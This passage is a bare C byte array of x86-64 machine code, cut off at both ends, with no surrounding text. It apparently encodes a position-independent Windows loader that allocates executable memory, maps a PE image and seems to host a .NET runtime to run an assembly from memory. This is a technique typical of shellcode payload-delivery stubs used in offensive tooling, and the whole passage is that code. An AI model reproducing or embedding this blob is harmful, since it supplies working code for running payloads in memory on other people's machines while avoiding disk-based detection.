0x8d, \n  0x8f, 0x90, 0x08, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4c, 0x8d, \n  0x87, 0x80, 0x08, 0x00, 0x00, 0x33, 0xc9, 0xff, 0x97, 0x98, 0x01, 0x00, \n  0x00, 0x85, 0xc0, 0x79, 0x10, 0x4c, 0x21, 0x66, 0x10, 0x33, 0xc0, 0xe9, \n  0x45, 0x01, 0x00, 0x00, 0x4c, 0x21, 0x26, 0xeb, 0xcb, 0x48, 0x8b, 0x4e, \n  0x10, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x50, 0x85, 0xc0, 0x0f, 0x88, 0x2b, \n  0x01, 0x00, 0x00, 0x4c, 0x8d, 0x85, 0x0c, 0x01, 0x00, 0x00, 0x4c, 0x8d, \n  0x76, 0x18, 0x45, 0x38, 0x20, 0x75, 0x12, 0x48, 0x8b, 0x4e, 0x10, 0x49, \n  0x8b, 0xd6, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x68, 0x44, 0x8b, 0xf8, 0xeb, \n  0x48, 0x48, 0x8d, 0x44, 0x24, 0x30, 0x44, 0x89, 0x7c, 0x24, 0x28, 0x41, \n  0x83, 0xc9, 0xff, 0x48, 0x89, 0x44, 0x24, 0x20, 0x33, 0xd2, 0x33, 0xc9, \n  0xff, 0x57, 0x70, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0xff, 0x97, 0x30, 0x01, \n  0x00, 0x00, 0x48, 0x8b, 0x4e, 0x10, 0x4d, 0x8b, 0xce, 0x45, 0x33, 0xc0, \n  0x48, 0x8b, 0xd0, 0x48, 0x8b, 0xd8, 0x4c, 0x8b, 0x11, 0x41, 0xff, 0x52, \n  0x60, 0x48, 0x8b, 0xcb, 0x44, 0x8b, 0xf8, 0xff, 0x97, 0x38, 0x01, 0x00, \n  0x00, 0x45, 0x85, 0xff, 0x0f, 0x88, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x8b, \n  0x0e, 0x48, 0x8d, 0x97, 0xa0, 0x08, 0x00, 0x00, 0x4c, 0x8d, 0x46, 0x20, \n  0x48, 0x8b, 0x01, 0xff, 0x10, 0x85, 0xc0, 0x0f, 0x88, 0x9d, 0x00, 0x00, \n  0x00, 0x8b, 0x85, 0x24, 0x05, 0x00, 0x00, 0x4c, 0x8d, 0x84, 0x24, 0x78, \n  0x02, 0x00, 0x00, 0x44, 0x21, 0xa4, 0x24, 0x7c, 0x02, 0x00, 0x00, 0xb9, \n  0x11, 0x00, 0x00, 0x00, 0x89, 0x84, 0x24, 0x78, 0x02, 0x00, 0x00, 0x8d, \n  0x51, 0xf0, 0xff, 0x97, 0x00, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xd8, 0x48, \n  0x85, 0xc0, 0x74, 0x6a, 0x4c, 0x8b, 0x43, 0x10, 0x33, 0xc0, 0x39, 0x85, \n  0x24, 0x05, 0x00, 0x00, 0x76, 0x15, 0x8a, 0x8c, 0x28, 0x28, 0x05, 0x00, \n  0x00, 0x42, 0x88, 0x0c, 0x00, 0xff, 0xc0, 0x3b, 0x85, 0x24, 0x05, 0x00, \n  0x00, 0x72, 0xeb, 0x48, 0x8b, 0x4e, 0x20, 0x4c, 0x8d, 0x46, 0x28, 0x48, \n  0x8b, 0xd3, 0x48, 0x8b, 0x01, 0xff, 0x90, 0x68, 0x01, 0x00, 0x00, 0x85, \n  0xc0, 0x48, 0x8b, 0x43, 0x10, 0x41, 0x0f, 0x94, 0xc4, 0x33, 0xd2, 0x39, \n  0x95, 0x24, 0x05, 0x00, 0x00, 0x76, 0x16, 0xc6, 0x84, 0x2a, 0x28, 0x05, \n  0x00, 0x00, 0x00, 0xc6, 0x04, 0x02, 0x00, 0xff, 0xc2, 0x3b, 0x95, 0x24, \n  0x05, 0x00, 0x00, 0x72, 0xea, 0x48, 0x8b, 0xcb, 0xff, 0x97, 0x18, 0x01, \n  0x00, 0x00, 0x41, 0x8b, 0xc4, 0x4c, 0x8d, 0x9c, 0x24, 0x30, 0x02, 0x00, \n  0x00, 0x49, 0x8b, 0x5b, 0x38, 0x49, 0x8b, 0x6b, 0x40, 0x49, 0x8b, 0xe3, \n  0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c, 0x5f, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc, \n  0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x56, 0x57, \n  0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x81, 0xec, 0x80, 0x01, 0x00, \n  0x00, 0x4c, 0x8b, 0x41, 0x28, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0x51, 0x48, \n  0xe8, 0x7f, 0x1a, 0x00, 0x00, 0x4c, 0x8b, 0x43, 0x28, 0x48, 0x8b, 0xcb, \n  0x48, 0x8b, 0x53, 0x50, 0x4c, 0x8b, 0xe0, 0xe8, 0x6c, 0x1a, 0x00, 0x00, \n  0x4c, 0x8b, 0x43, 0x28, 0x48, 0x8b, 0xcb, 0x48, 0x8b, 0x93, 0xe8, 0x01, \n  0x00, 0x00, 0x4c, 0x8b, 0xf8, 0xe8, 0x56, 0x1a, 0x00, 0x00, 0x48, 0x8b, \n  0xe8, 0x4d, 0x85, 0xe4, 0x74, 0x30, 0x4d, 0x85, 0xff, 0x74, 0x2b, 0x48, \n  0x85, 0xc0, 0x74, 0x26, 0x8b, 0x13, 0x33, 0xc9, 0x41, 0xb8, 0x00, 0x30, \n  0x00, 0x00, 0x44, 0x8d, 0x49, 0x04, 0x41, 0xff, 0xd4, 0x48, 0x8b, 0xf8, \n  0x48, 0x85, 0xc0, 0x75, 0x2c, 0x83, 0xbb, 0x30, 0x02, 0x00, 0x00, 0x02, \n  0x75, 0x04, 0x33, 0xc9, 0xff, 0xd5, 0x83, 0xc8, 0xff, 0x4c, 0x8d, 0x9c, \n  0x24, 0x80, 0x01, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x38, 0x49, 0x8b, 0x6b, \n  0x40, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c, 0x5f, 0x5e, \n  0xc3, 0x44, 0x8b, 0x03, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0xe8, 0x71, \n  0x1f, 0x00, 0x00, 0x33, 0xd2, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0x44, 0x8d, \n  0x42, 0x40, 0xe8, 0x81, 0x1f, 0x00, 0x00, 0x83, 0xbf, 0x34, 0x02, 0x00, \n  0x00, 0x03, 0x4c, 0x8d, 0x77, 0x28, 0x75, 0x3a, 0x44, 0x8b, 0x0f, 0x4c, \n  0x8d, 0x87, 0x3c, 0x02, 0x00, 0x00, 0x41, 0x81, 0xe9, 0x3c, 0x02, 0x00, \n  0x00, 0x48, 0x8d, 0x57, 0x14, 0x48, 0x8d, 0x4f, 0x04, 0xe8, 0x6a, 0x1b, \n  0x00, 0x00, 0x49, 0x8b, 0x16, 0x48, 0x8d, 0x8f, 0x2c, 0x0c, 0x00, 0x00, \n  0xe8, 0x1b, 0x1a, 0x00, 0x00, 0x48, 0x3b, 0x87, 0x30, 0x0d, 0x00, 0x00, \n  0x0f, 0x85, 0x55, 0x02, 0x00, 0x00, 0x4d, 0x8b, 0x06, 0x48, 0x8b, 0xcf, \n  0x48, 0x8b, 0x57, 0x30, 0xe8, 0x8b, 0x19, 0x00, 0x00, 0x48, 0x89, 0x47, \n  0x30, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x60, 0xff, 0xff, 0xff, 0x48, 0x8d, \n  0x9f, 0x40, 0x02, 0x00, 0x00, 0x8a, 0x03, 0x33, 0xd2, 0x84, 0xc0, 0x74, \n  0x3b, 0x33, 0xc9, 0x3c, 0x3b, 0x74, 0x17, 0x81, 0xfa, 0x04, 0x01, 0x00, \n  0x00, 0x73, 0x0f, 0xff, 0xc2, 0x88, 0x44, 0x0c, 0x70, 0x8b, 0xca, 0x8a, \n  0x04, 0x1a, 0x84, 0xc0, 0x75, 0xe5, 0x85, 0xd2, 0x74, 0x1a, 0x8d, 0x4a, \n  0x01, 0xc6, 0x44, 0x14, 0x70, 0x00, 0x48, 0x03, 0xd9, 0x48, 0x8d, 0x54, \n  0x24, 0x70, 0x48, 0x8b, 0xcf, 0xe8, 0xa6, 0x16, 0x00, 0x00, 0xeb, 0xbd, \n  0xbe, 0x01, 0x00, 0x00, 0x00, 0x39, 0xb7, 0x3c, 0x02, 0x00, 0x00, 0x76, \n  0x33, 0x4d, 0x8b, 0x06, 0x48, 0x8b, 0xcf, 0x8b, 0xde, 0x48, 0x8b, 0x54, \n  0xdf, 0x30, 0xe8, 0x15, 0x19, 0x00, 0x00, 0x48, 0x89, 0x44, 0xdf, 0x30, \n  0x48, 0x85, 0xc0, 0x75, 0x0d, 0x48, 0x39, 0x87, 0xa0, 0x01, 0x00, 0x00, \n  0x0f, 0x85, 0xb9, 0x01, 0x00, 0x00, 0xff, 0xc6, 0x3b, 0xb7, 0x3c, 0x02, \n  0x00, 0x00, 0x72, 0xcd, 0x8b, 0x87, 0x20, 0x09, 0x00, 0x00, 0x83, 0xf8, \n  0x02, 0x75, 0x1f, 0x48, 0x8b, 0xcf, 0xe8, 0x5d, 0xef, 0xff, 0xff, 0x41, \n  0xbe, 0x01, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0x94, 0x01, 0x00, \n  0x00, 0x48, 0x8b, 0x9f, 0x60, 0x0d, 0x00, 0x00, 0xeb, 0x23, 0x41, 0xbe, \n  0x01, 0x00, 0x00, 0x00, 0x83, 0xf8, 0x03, 0x0f, 0x84, 0x7c, 0x01, 0x00, \n  0x00, 0x48, 0x8d, 0x9f, 0x60, 0x0d, 0x00, 0x00, 0x41, 0x3b, 0xc6, 0x74, \n  0x08, 0x48, 0x8b, 0x9c, 0x24, 0xb0, 0x01, 0x00, 0x00, 0x44, 0x39, 0xb7, \n  0x70, 0x05, 0x00, 0x00, 0x74, 0x32, 0x48, 0x8b, 0xcf, 0xe8, 0x56, 0xed, \n  0xff, 0xff, 0x85, 0xc0, 0x75, 0x0d, 0x83, 0xbf, 0x70, 0x05, 0x00, 0x00, \n  0x02, 0x0f, 0x84, 0x46, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xcf, 0xe8, 0x69, \n  0xee, 0xff, 0xff, 0x85, 0xc0, 0x75, 0x0d, 0x83, 0xbf, 0x70, 0x05, 0x00, \n  0x00, 0x02, 0x0f, 0x84, 0x2d, 0x01, 0x00, 0x00, 0x44, 0x39, 0x73, 0x08, \n  0x0f, 0x84, 0xad, 0x00, 0x00, 0x00, 0x8b, 0x93, 0x24, 0x05, 0x00, 0x00, \n  0x33, 0xc9, 0x48, 0x81, 0xc2, 0x2f, 0x15, 0x00, 0x00, 0x41, 0xb8, 0x00, \n  0x30, 0x00, 0x00, 0x48, 0x81, 0xe2, 0x00, 0xf0, 0xff, 0xff, 0x44, 0x8d, \n  0x49, 0x04, 0x41, 0xff, 0xd4, 0x48, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x0f, \n  0x84, 0xf4, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x30, 0x05, 0x00, 0x00, 0x48, \n  0x8b, 0xd3, 0x48, 0x8b, 0xc8, 0xe8, 0xa2, 0x1d, 0x00, 0x00, 0x8b, 0x43, \n  0x08, 0x8d, 0x48, 0xfd, 0x41, 0x3b, 0xce, 0x76, 0x1a, 0x83, 0xf8, 0x02, \n  0x75, 0x5d, 0x48, 0x8d, 0x96, 0x28, 0x05, 0x00, 0x00, 0x48, 0x8d, 0x8b, \n  0x28, 0x05, 0x00, 0x00, 0xe8, 0x03, 0x1b, 0x00, 0x00, 0xeb, 0x45, 0x44, \n  0x8b, 0x83, 0x24, 0x05, 0x00, 0x00, 0x4c, 0x8d, 0x8b, 0x28, 0x05, 0x00, \n  0x00, 0x0f, 0xb7, 0xc8, 0x48, 0x8d, 0x96, 0x28, 0x05, 0x00, 0x00, 0x66, \n  0x41, 0x2b, 0xce, 0xb8, 0x00, 0x01, 0x00, 0x00, 0x66, 0x0b, 0xc8, 0x48, \n  0x8d, 0x84, 0x24, 0xb0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x28, \n  0x8b, 0x83, 0x20, 0x05, 0x00, 0x00, 0x89, 0x44, 0x24, 0x20, 0xff, 0x97, \n  0x00, 0x02, 0x00, 0x00, 0x85, 0xc0, 0x75, 0x79, 0x48, 0x8b, 0xde, 0x8b, \n  0x0b, 0x8d, 0x41, 0xfd, 0x41, 0x3b, 0xc6, 0x76, 0x50, 0x8d, 0x41, 0xff, \n  0x41, 0x3b, 0xc6, 0x76, 0x15, 0x8d, 0x41, 0xfb, 0x41, 0x3b, 0xc6, 0x77, \n  0x4b, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0xe8, 0xa8, 0x0f, 0x00, 0x00, \n  0xeb, 0x3e, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0x48, 0x8b, 0xd3, 0x48, 0x8b, \n  0xcf, 0xe8, 0x62, 0xfa, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x10, 0x4c, 0x8d, \n  0x44, 0x24, 0x30, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0xe8, 0x9e, 0x00, \n  0x00, 0x00, 0x48, 0x8d, 0x54, 0x24, 0x30, 0x48, 0x8b, 0xcf, 0xe8, 0xd1, \n  0xf4, 0xff, 0xff, 0xeb, 0x0b, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0xe8, \n  0xb4, 0x04, 0x00, 0x00, 0x83, 0xbf, 0x30, 0x02, 0x00, 0x00, 0x03, 0x75, \n  0x08, 0xeb, 0xfe, 0x41, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x8b, 0x87, 0x20, \n  0x09, 0x00, 0x00, 0xbe, 0x00, 0xc0, 0x00, 0x00, 0x83, 0xe8, 0x02, 0x41, \n  0x3b, 0xc6, 0x77, 0x31, 0x48, 0x8b, 0x8f, 0x60, 0x0d, 0x00, 0x00, 0x48, \n  0x85, 0xc9, 0x74, 0x25, 0x44, 0x8b, 0x87, 0x58, 0x0d, 0x00, 0x00, 0x33, \n  0xd2, 0xe8, 0xb2, 0x1c, 0x00, 0x00, 0x48, 0x8b, 0x8f, 0x60, 0x0d, 0x00, \n  0x00, 0x44, 0x8b, 0xc6, 0x33, 0xd2, 0x41, 0xff, 0xd7, 0x48, 0x83, 0xa7, \n  0x60, 0x0d, 0x00, 0x00, 0x00, 0x44, 0x8b, 0x07, 0x33, 0xd2, 0x8b, 0x9f, \n  0x30, 0x02, 0x00, 0x00, 0x48, 0x8b, 0xcf, 0xe8, 0x88, 0x1c, 0x00, 0x00, \n  0x44, 0x8b, 0xc6, 0x33, 0xd2, 0x48, 0x8b, 0xcf, 0x41, 0xff, 0xd7, 0x83, \n  0xfb, 0x02, 0x75, 0x04, 0x33, 0xc9, 0xff, 0xd5, 0x33, 0xc0, 0xe9, 0xb2, \n  0xfc, 0xff, 0xff, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x55, 0x56, 0x57, \n  0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0xac, 0x24, \n  0xe0, 0xfd, 0xff, 0xff, 0x48, 0x81, 0xec, 0x20, 0x03, 0x00, 0x00, 0x45, \n  0x33, 0xed, 0x33, 0xc0, 0x83, 0x3a, 0x02, 0x0f, 0x57, 0xc0, 0x4d, 0x8b, \n  0xf0, 0x4c, 0x89, 0x6c, 0x24, 0x50, 0x48, 0x8b, 0xf2, 0x48, 0x89, 0x45, \n  0x88, 0x45, 0x8d, 0x7d, 0x01, 0x66, 0x44, 0x89, 0xad, 0x68, 0x02, 0x00, \n  0x00, 0x48, 0x8b, 0xd9, 0x41, 0x8b, 0xfd, 0x0f, 0x11, 0x44, 0x24, 0x78, \n  0x0f, 0x85, 0xf0, 0x01, 0x00, 0x00, 0x49, 0x8b, 0x48, 0x28, 0x49, 0x8d, \n  0x50, 0x38, 0x48, 0x8b, 0x01, 0xff, 0x90, 0x80, 0x00, 0x00, 0x00, 0x85, \n  0xc0, 0x0f, 0x88, 0xce, 0x01, 0x00, 0x00, 0x49, 0x8b, 0x4e, 0x38, 0x48, \n  0x8d, 0x54, 0x24, 0x50, 0x48, 0x8b, 0x01, 0xff, 0x90, 0x90, 0x00, 0x00, \n  0x00, 0x85, 0xc0, 0x0f, 0x88, 0x86, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x4c, \n  0x24, 0x50, 0x4c, 0x8d, 0x44, 0x24, 0x48, 0x41, 0x8b, 0xd7, 0xff, 0x93, \n  0x20, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0x4c, 0x8d, 0x44, \n  0x24, 0x44, 0x41, 0x8b, 0xd7, 0xff, 0x93, 0x28, 0x01, 0x00, 0x00, 0x8b, \n  0x44, 0x24, 0x44, 0x2b, 0x44, 0x24, 0x48, 0x41, 0x03, 0xc7, 0x0f, 0x84, \n  0x26, 0x01, 0x00, 0x00, 0x41, 0x8d, 0x4d, 0x0c, 0x45, 0x8b, 0xc7, 0x33, \n  0xd2, 0xff, 0x93, 0x08, 0x01, 0x00, 0x00, 0x4c, 0x8d, 0x86, 0x0c, 0x04, \n  0x00, 0x00, 0x33, 0xd2, 0x48, 0x8b, 0xf8, 0x45, 0x38, 0x28, 0x0f, 0x84, \n  0xa0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x45, 0x10, 0x41, 0xbf, 0x00, 0x01, \n  0x00, 0x00, 0x44, 0x89, 0x7c, 0x24, 0x28, 0x41, 0x83, 0xc9, 0xff, 0x33, \n  0xc9, 0x48, 0x89, 0x44, 0x24, 0x20, 0xff, 0x53, 0x70, 0x48, 0x8d, 0x54, \n  0x24, 0x40, 0x48, 0x8d, 0x4d, 0x10, 0xff, 0x93, 0xf8, 0x00, 0x00, 0x00, \n  0x44, 0x8b, 0x44, 0x24, 0x40, 0xb9, 0x08, 0x20, 0x00, 0x00, 0x66, 0x89, \n  0x4c, 0x24, 0x60, 0x33, 0xd2, 0x41, 0x8d, 0x4d, 0x08, 0x4c, 0x8b, 0xf8, \n  0xff, 0x93, 0x08, 0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x68, 0x44, \n  0x89, 0xad, 0x78, 0x02, 0x00, 0x00, 0x44, 0x39, 0x6c, 0x24, 0x40, 0x76, \n  0x3b, 0x41, 0x8b, 0xcd, 0x45, 0x8d, 0x65, 0x01, 0x49, 0x8b, 0x0c, 0xcf, \n  0xff, 0x93, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x4c, 0x24, 0x68, 0x48, \n  0x8d, 0x95, 0x78, 0x02, 0x00, 0x00, 0x4c, 0x8b, 0xc0, 0xff, 0x93, 0x10, \n  0x01, 0x00, 0x00, 0x8b, 0x8d, 0x78, 0x02, 0x00, 0x00, 0x41, 0x03, 0xcc, \n  0x89, 0x8d, 0x78, 0x02, 0x00, 0x00, 0x3b, 0x4c, 0x24, 0x40, 0x72, 0xcc, \n  0x41, 0xbf, 0x01, 0x00, 0x00, 0x00, 0xeb, 0x46, 0xb9, 0x08, 0x20, 0x00, \n  0x00, 0x45, 0x8b, 0xc7, 0x66, 0x89, 0x4c, 0x24, 0x60, 0xb9, 0x08, 0x00, \n  0x00, 0x00, 0xff, 0x93, 0x08, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x68, \n  0x02, 0x00, 0x00, 0x44, 0x89, 0xad, 0x78, 0x02, 0x00, 0x00, 0x48, 0x89, \n  0x44, 0x24, 0x68, 0xff, 0x93, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x4c, \n  0x24, 0x68, 0x48, 0x8d, 0x95, 0x78, 0x02, 0x00, 0x00, 0x4c, 0x8b, 0xc0, \n  0xff, 0x93, 0x10, 0x01, 0x00, 0x00, 0x4c, 0x8d, 0x44, 0x24, 0x60, 0x44, \n  0x89, 0xad, 0x78, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x95, 0x78, 0x02, 0x00, \n  0x00, 0x48, 0x8b, 0xcf, 0xff, 0x93, 0x10, 0x01, 0x00, 0x00, 0x49, 0x8b, \n  0x4e, 0x38, 0x4c, 0x8d, 0x4d, 0xd8, 0xf2, 0x0f, 0x10, 0x4d, 0x88, 0x48, \n  0x8d, 0x55, 0xa0, 0x66, 0x44, 0x89, 0x7c, 0x24, 0x78, 0x4c, 0x8b, 0xc7, \n  0x4c, 0x89, 0x6d, 0x80, 0x0f, 0x10, 0x44, 0x24, 0x78, 0x48, 0x8b, 0x01, \n  0xf2, 0x0f, 0x11, 0x4d, 0xb0, 0x0f, 0x29, 0x45, 0xa0, 0xff, 0x90, 0x28, \n  0x01, 0x00, 0x00, 0x48, 0x85, 0xff, 0x0f, 0x84, 0xeb, 0x01, 0x00, 0x00, \n  0x48, 0x8b, 0x4c, 0x24, 0x68, 0xff, 0x93, 0x18, 0x01, 0x00, 0x00, 0x48, \n  0x8b, 0xcf, 0xff, 0x93, 0x18, 0x01, 0x00, 0x00, 0xe9, 0xd2, 0x01, 0x00, \n  0x00, 0x4d, 0x89, 0x6e, 0x38, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0x4c, 0x8d, \n  0x82, 0x0c, 0x02, 0x00, 0x00, 0x41, 0xbf, 0x00, 0x01, 0x00, 0x00, 0x48, \n  0x8d, 0x45, 0x10, 0x44, 0x89, 0x7c, 0x24, 0x28, 0x41, 0x83, 0xcc, 0xff, \n  0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x8b, 0xcc, 0x33, 0xd2, 0x33, 0xc9, \n  0xff, 0x53, 0x70, 0x48, 0x8d, 0x4d, 0x10, 0xff, 0x93, 0x30, 0x01, 0x00, \n  0x00, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, \n  0x0f, 0x84, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x45, 0x10, 0x44, 0x89, \n  0x7c, 0x24, 0x28, 0x4c, 0x8d, 0x86, 0x0c, 0x03, 0x00, 0x00, 0x48, 0x89, \n  0x44, 0x24, 0x20, 0x45, 0x8b, 0xcc, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x53, \n  0x70, 0x48, 0x8d, 0x4d, 0x10, 0xff, 0x93, 0x30, 0x01, 0x00, 0x00, 0x4c, \n  0x8b, 0xe8, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x41, 0x01, 0x00, 0x00, 0x49, \n  0x8b, 0x4e, 0x28, 0x49, 0x8d, 0x46, 0x30, 0x4c, 0x8b, 0xc0, 0x48, 0x89, \n  0x45, 0x90, 0x48, 0x8b, 0xd7, 0x4c, 0x8b, 0x09, 0x41, 0xff, 0x91, 0x88, \n  0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x88, 0x14, 0x01, 0x00, 0x00, 0x33, \n  0xff, 0x4c, 0x8d, 0x86, 0x0c, 0x04, 0x00, 0x00, 0x41, 0x38, 0x38, 0x0f, \n  0x84, 0xab, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x45, 0x10, 0x44, 0x89, 0x7c, \n  0x24, 0x28, 0x45, 0x8b, 0xcc, 0x48, 0x89, 0x44, 0x24, 0x20, 0x33, 0xd2, \n  0x33, 0xc9, 0xff, 0x53, 0x70, 0x48, 0x8d, 0x54, 0x24, 0x40, 0x48, 0x8d, \n  0x4d, 0x10, 0xff, 0x93, 0xf8, 0x00, 0x00, 0x00, 0x44, 0x8b, 0x44, 0x24, \n  0x40, 0x8d, 0x4f, 0x0c, 0x33, 0xd2, 0x4c, 0x8b, 0xf8, 0xff, 0x93, 0x08, \n  0x01, 0x00, 0x00, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0x69, 0x83, \n  0xa5, 0x78, 0x02, 0x00, 0x00, 0x00, 0x83, 0x7c, 0x24, 0x40, 0x00, 0x76, \n  0x5b, 0x33, 0xc9, 0x8d, 0x71, 0x08, 0x44, 0x8d, 0x61, 0x01, 0x49, 0x8b, \n  0x0c, 0xcf, 0xff, 0x93, 0x30, 0x01, 0x00, 0x00, 0x4c, 0x8d, 0x45, 0xc0, \n  0x66, 0x89, 0x75, 0xc0, 0x48, 0x8d, 0x95, 0x78, 0x02, 0x00, 0x00, 0x48, \n  0x89, 0x45, 0xc8, 0x48, 0x8b, 0xcf, 0xff, 0x93, 0x10, 0x01, 0x00, 0x00, \n  0x44, 0x8b, 0xf0, 0x85, 0xc0, 0x79, 0x0b, 0x48, 0x8b, 0xcf, 0xff, 0x93, \n  0x18, 0x01, 0x00, 0x00, 0x33, 0xff, 0x8b, 0x8d, 0x78, 0x02, 0x00, 0x00, \n  0x41, 0x03, 0xcc, 0x89, 0x8d, 0x78, 0x02, 0x00, 0x00, 0x3b, 0x4c, 0x24, \n  0x40, 0x72, 0xb3, 0x45, 0x85, 0xf6, 0x78, 0x52, 0x48, 0x8b, 0x4d, 0x90, \n  0x48, 0x8d, 0x55, 0xf0, 0x48, 0x89, 0x54, 0x24, 0x30, 0x0f, 0x57, 0xc0, \n  0x48, 0x8d, 0x55, 0xa0, 0x0f, 0x29, 0x45, 0xa0, 0xf2, 0x0f, 0x10, 0x45, \n  0x88, 0x45, 0x33, 0xc9, 0x48, 0x8b, 0x09, 0x41, 0xb8, 0x18, 0x01, 0x00, \n  0x00, 0x48, 0x89, 0x7c, 0x24, 0x28, 0x48, 0x89, 0x54, 0x24, 0x20, 0x49, \n  0x8b, 0xd5, 0xf2, 0x0f, 0x11, 0x45, 0xb0, 0x48, 0x8b, 0x01, 0xff, 0x90, \n  0xc8, 0x01, 0x00, 0x00, 0x48, 0x85, 0xff, 0x74, 0x09, 0x48, 0x8b, 0xcf, \n  0xff, 0x93, 0x18, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x7c, 0x24, 0x58, 0x49, \n  0x8b, 0xcd, 0xff, 0x93, 0x38, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xcf, 0xff, \n  0x93, 0x38, 0x01, 0x00, 0x00, 0x41, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x41, \n  0x8b, 0xc7, 0x48, 0x8b, 0x9c, 0x24, 0x60, 0x03, 0x00, 0x00, 0x48, 0x81, \n  0xc4, 0x20, 0x03, 0x00, 0x00, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, \n  0x5c, 0x5f, 0x5e, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x54, 0x24, \n  0x10, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, \n  0x57, 0x48, 0x8d, 0xac, 0x24, 0x38, 0xfd, 0xff, 0xff, 0x48, 0x81, 0xec, \n  0xc8, 0x03, 0x00, 0x00, 0x4c, 0x8d, 0xba, 0x28, 0x05, 0x00, 0x00, 0x33, \n  0xff, 0x4d, 0x63, 0x77, 0x3c, 0x48, 0x8b, 0xf1, 0x4d, 0x03, 0xf7, 0x48, \n  0x89, 0x7c, 0x24, 0x60, 0x33, 0xc9, 0x4c, 0x89, 0x75, 0x88, 0x4c, 0x8b, \n  0xea, 0x48, 0x89, 0xbd, 0x28, 0x03, 0x00, 0x00, 0x48, 0x89, 0x7c, 0x24, \n  0x50, 0x4c, 0x89, 0x7d, 0x80, 0xff, 0x56, 0x40, 0x48, 0x8b, 0xc8, 0x48, \n  0x63, 0x40, 0x3c, 0x0f, 0xb7, 0x4c, 0x08, 0x04, 0x66, 0x41, 0x39, 0x4e, \n  0x04, 0x0f, 0x85, 0x0f, 0x09, 0x00, 0x00, 0x41, 0x8b, 0x46, 0x50, 0x48, \n  0x89, 0x45, 0x98, 0x41, 0x8b, 0x86, 0xb4, 0x00, 0x00, 0x00, 0x89, 0x85, \n  0x20, 0x03, 0x00, 0x00, 0x85, 0xc0, 0x75, 0x0b, 0x49, 0x8b, 0x46, 0x30, \n  0x48, 0x89, 0x85, 0x28, 0x03, 0x00, 0x00, 0xb9, 0x03, 0x00, 0x00, 0x00, \n  0x48, 0x89, 0x7c, 0x24, 0x30, 0x48, 0x8d, 0x9e, 0x25, 0x06, 0x00, 0x00, \n  0x8d, 0x41, 0xfe, 0x44, 0x8d, 0x61, 0xff, 0x40, 0x38, 0x3b, 0x75, 0x34, \n  0xc7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x08, 0x4c, 0x8d, 0x4d, 0x98, \n  0x45, 0x33, 0xc0, 0xc7, 0x44, 0x24, 0x20, 0x40, 0x00, 0x00, 0x00, 0xba, \n  0x1f, 0x00, 0x0f, 0x00, 0x48, 0x8d, 0x4c, 0x24, 0x68, 0xff, 0x96, 0x10, \n  0x02, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0x9f, 0x08, 0x00, 0x00, 0xe9, \n  0x9b, 0x00, 0x00, 0x00, 0x89, 0x7c, 0x24, 0x28, 0x45, 0x33, 0xc9, 0x89, \n  0x4c, 0x24, 0x20, 0x44, 0x8b, 0xc0, 0x48, 0x8b, 0xcb, 0xba, 0x00, 0x00, \n  0x00, 0x80, 0xff, 0x96, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xf8, 0x48, \n  0xff, 0xc8, 0x48, 0x83, 0xf8, 0xfd, 0x0f, 0x87, 0x6e, 0x08, 0x00, 0x00, \n  0x33, 0xdb, 0x48, 0x8d, 0x54, 0x24, 0x58, 0x48, 